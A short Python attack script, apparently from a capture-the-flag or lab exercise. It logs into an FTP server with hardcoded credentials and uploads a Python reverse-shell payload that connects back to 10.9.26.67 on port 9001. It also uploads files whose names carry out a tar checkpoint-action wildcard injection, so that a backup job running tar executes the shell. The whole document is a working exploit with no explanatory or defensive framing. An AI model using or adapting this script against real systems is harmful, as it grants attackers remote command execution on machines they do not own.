#!/usr/bin/env python3.7 
 
from ftplib import FTP 
import os
import fileinput
import io
 
host = "172.20.0.1"
username = "backupmgr"
password = "SuperS1ckP4ssw0rd123!"
 
ftp = FTP(host=host)
 
login_status = ftp.login(user=username, passwd=password)
print(login_status)
ftp.set_pasv(False)
ftp.cwd('files')
print(ftp.dir())
 
rev = io.BytesIO(b'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.26.67",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'')
emptyFile = io.BytesIO(b'')
ftp.storlines('STOR rev.sh', rev)
ftp.storlines('STOR --checkpoint=1', emptyFile)
ftp.storlines('STOR --checkpoint-action=exec=sh rev.sh', emptyFile)
ftp.dir()
 
ftp.quit()